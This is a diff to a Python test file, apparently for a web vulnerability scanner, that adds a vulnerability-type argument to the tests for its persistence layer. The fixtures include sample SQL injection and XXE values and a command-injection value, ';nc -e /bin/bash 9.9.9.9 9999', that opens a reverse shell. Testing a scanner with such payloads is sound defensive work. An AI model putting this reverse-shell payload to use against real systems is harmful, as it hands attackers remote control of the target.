@@ -68,7 +68,7 @@ async def test_persister_basic():
     assert persister.have_attacks_started()
 
     naughty_get = Request("http://httpbin.org/?k=1%20%OR%200")
-    persister.add_vulnerability(1, "SQL Injection", 1, naughty_get, "k", "OR bypass")
+    persister.add_vulnerability("sql", 1, "SQL Injection", 1, naughty_get, "k", "OR bypass")
     assert next(persister.get_payloads())
     persister.flush_attacks()
     assert not persister.have_attacks_started()
@@ -80,7 +80,8 @@ async def test_persister_basic():
         "http://httpbin.org/post?var1=a&var2=b",
         post_params=[["post1", "c"], ["post2", ";nc -e /bin/bash 9.9.9.9 9999"]]
     )
-    persister.add_vulnerability(1, "Command Execution", 1, naughty_post, "post2", ";nc -e /bin/bash 9.9.9.9 9999")
+    persister.add_vulnerability(
+        "exec", 1, "Command Execution", 1, naughty_post, "post2", ";nc -e /bin/bash 9.9.9.9 9999")
     payload = next(persister.get_payloads())
     persister.close()
     assert naughty_post == payload.evil_request
@@ -137,7 +138,7 @@ async def test_persister_upload():
         post_params=[["post1", "c"], ["post2", "d"]],
         file_params=[["calendar", ("calendar.xml", "<xml>XXE there</xml>", "application/xml")]]
     )
-    persister.add_vulnerability(1, "Command Execution", 1, naughty_file, "calendar", "<xml>XXE there</xml>")
+    persister.add_vulnerability("exec", 1, "Command Execution", 1, naughty_file, "calendar", "<xml>XXE there</xml>")
     payload = next(persister.get_payloads())
     assert naughty_file == payload.evil_request
     assert payload.parameter == "calendar"
@@ -205,7 +206,7 @@ def test_raw_post():
         post_params=json.dumps({"z": "I'm a naughty value", "a": 2}),
         enctype="application/json"
     )
-    persister.add_vulnerability(1, "Command Execution", 1, naughty_json, "z", "I'm a naughty value")
+    persister.add_vulnerability("exec", 1, "Command Execution", 1, naughty_json, "z", "I'm a naughty value")
     payload = next(persister.get_payloads())
     assert naughty_json == payload.evil_request
     assert payload.parameter == "z"
